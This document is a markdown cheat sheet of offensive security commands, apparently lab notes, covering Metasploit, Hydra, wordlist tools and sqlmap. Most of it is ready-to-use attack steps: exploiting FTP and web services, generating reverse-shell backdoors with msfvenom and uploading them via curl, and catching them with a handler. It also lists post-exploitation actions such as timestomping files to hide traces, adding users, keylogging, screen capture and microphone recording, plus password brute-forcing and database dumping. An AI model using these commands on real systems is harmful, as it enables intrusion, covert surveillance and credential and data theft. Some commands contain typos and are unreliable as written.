# Exploit
## Metasploit
### Initial Configuration
* sudo msfdb init && msfconsole
* db_status

### Basic command
* help
* help load or ? load
* search date:2021:01
* search name:tomcat
* search port:80
* search cve:2021
* search type:exploit cve:2020-10914
* search type:-exploit apache
* search target:windows platform:-x86 type:-post

### Using Modules
* use [module-name]
* info
* show options
* set [option] [value]
* show payloads
* set payload [payload-name]
* show targets
* set target [id]
* show missing
* check
* run `or exploit`

### Portscan (ub1404)
* search portscan
* use scanner/portscan/tcp
* set RHOST [ip-address]
* set PORTS 1-3000
* run

### SMB Scan (win2k8)
* search scanner/smb
* use auxiliary/scanner/smb/smb_version
* set RHOST [ip-address]
* run

### Attack Ub1404
* nmap -p- [ub1404-ip]
* use exploit/unix/ftp/proftpd_modcopy_exec
* set payload payload/cmd/unix/reverse_perl
* set RHOSTS [ub1404-ip]
* set SITEPATH /var/www/html
* set LHOST [kali-ip]
* run
* Ctrl + Z `Change shell to command process`
* use multi/manage/shell_to_meterpreter
* session -l
* set LPORT 8080
* set SESSION 1
* run

### Embbed Backdoor
* msfvenom -p php/meterpreter/reverse_tcp LHOST=[kali-ip] LPORT=4445  > php-backdoor.war
* curl -X PUT -d @/home/vagrant/php-backdoor.php [ub1404-ip]/uploads/backdoor.php
* use exploit/multi/handler
* set LHOST [kali-ip]
* set PORT 4445
* run
* curl [ub1404-ip]/uploads/backdoor.php
* You got meterpreter now

### Attack Shadow Web App(win2k8)
* use scanner/portscan/tcp
* set RHOST [ip-address]
* set PORTS 8000-10000
* run
* searchsploit Manage Engine Central 9
* use exploit/windows/http/manageengine_coneectionid_write
* set RHOST [win2k8-ip]
* setg LHOST [kali-ip]
* set RPORT 8383
* set SSL true
* run
* execute -f cmd.exe -i -H

### Embed Backdoor
* open C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-{Version}\tomcat-users.xml
* msfvenom -p java/jsp_shell_reverse_tcp LHOST=[kali-ip] LPORT=4445 -f war > backdoor.war
* msfconsole
* use exploit/multi/handler
* set LPORT 4445
* set PAYLOAD java/jsp_shell_reverse_tcp
* run

### Gether Services
* use post/windows/gather/enum_service
* set SESSION 1
* run
* use post/windows/gather/tcpnetstat
* set SESSION 1
* run

### Metasploit Sessions
* session -l `list sessions`
* session -v `verbose message and can use -x for more detail`
* session -d `list inactive sessions`
* session -n [name] [session-id] `naming session`
* session -i [session-id]
* session -u [session-id] `upgrade shell to meterpreter`
* session -k [session-id] `terminate specific session`
* session -K `terminate all session`

### Post-Exploit (What we need to do?)
* Explore
* Exfiltrate
* Persist
* Pivot

### Meterpreter (Post-Exploitation Operations)
* help stdapi
* help priv
* cd or lcd
* pwd or lpwd
* getpid or getuid
* sysinfo
* search -f *.rtf
* execute -f cmmmand.exe
* ps
* hosts
* services
* reboot or shutdown 

### Load Extensions
* load [extension-name]
* help [extension-name]
* run post/platform/function/name

Check Idle Time (Meterpreter extension)
```
idletime
```

Gether OS (Post modules)
```
run post/multi/gather/env
```

Modify timestamp with timestomp
```
ls /windows/win.ini
timestomp -m "01/01/1970 00:00:00" /windows/win.ini
```

Add New User
```
load incognito
add_user [username] [password]
run post/windows/manage/enable_rdp
```

Enable Key Logger
```
ps
migrate [process-id]
keyscan start
keyscan dump
```

Capture Screen
```
screenshort
```

Audio Recording
```
load espia
help record_mic
```

### Managing Metasploit
* database -h
* workspace -h
* workspace -a [workspace-name]
* hosts -t [label] [ip-address]
* hosts -c address,name,tags

### Integrating with Nmap
* nmap -n -A -oX nmap-data.xml [ub1404-ip]
* db_import nmap-data.xml
* hosts
* services
* vulns
* db_nmap -A -p- [ub1404-ip]
* db_export -f xml [filename] `archiving data to xml`

### Integration with OpenVAS
* Export report from OpenVAS(save as xml format)
* db_import [report-file-name]
* load openvas
* openvas_help

### Metasploit Console Scripting
* makerc `Create a resource script`
* resource `execute command from a script`

Embed ruby code inside a script
```
<ruby>
 ... add ruby code here ...
</ruby>
```
Command for Metasploit Console Scripting
```
# msfconsole -r [resourcefile] `execute a resource script`
msf5> ... `do something`
msf5> makerc [resourcefile]
msf5> resource [resourcefile]
```

## Hydra (Password Attack)
### Secure Shell
```
hydra -P /usr/shared/wordlists/rockyou.txt
	  -l root
	  ssl://10.0.4.5
	  -f -vVd 
	  -o result.txt
	  -e nsr
```

### Basic Authentication
```
hydra -P /usr/shared/wordlists/rockyou.txt
	  -l admin
	  10.0.4.5 http-get "/auth"
	  -f
```

### Form Authentication
```
hydra -P /usr/shared/wordlists/rockyou.txt
	  -l admin
	  10.0.4.5 http-post-form "/login:username=^USER^:password=^PASS^:submit=Login:F=Invalid username"
	  -f
```

### DVWA Authentication
```
hydra  -f -vVd -I -L tiny-wordlist.txt -P tiny-wordlist.txt \
    -s 8080 172.28.128.1 http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=mcqdbau64eprtq34n8o30h9t20; security=low:F=password incorrect"
```

### Create WordList
* crunch 4 4 `minimum 4 characters and maximum  4 characters`
* crunch 4 4 -o mywordlist.txt
* crunch 4 4 1234567890 -o mywordlist.txt
* crunch 4 4 -t @%,^ -o mywordlist.txt `@=lowercase characters, %=numbers, ,=uppercase characters, ^=symbols`
* crunch 4 4 -f /usr/share/crunch/charset.lst lalpha -o mywordlist
* cewl -d 2 -m 4 -w test.txt http://www.php.net `-d=depth, -m=minimum word length, -w=write`


## SQLmap

* sqlmap -u http://192.168.43.201/example.php?name=root -b
* sqlmap -u http://192.168.43.201/example.php?name=root --dbs
  - dbs => list all databases
  -	-D exercises --tables => list all tables
  - -D excercises -T users --columns => list all columns
  - --dump-all
  - -D exercises -T users --dump
  - -D exercises --dump
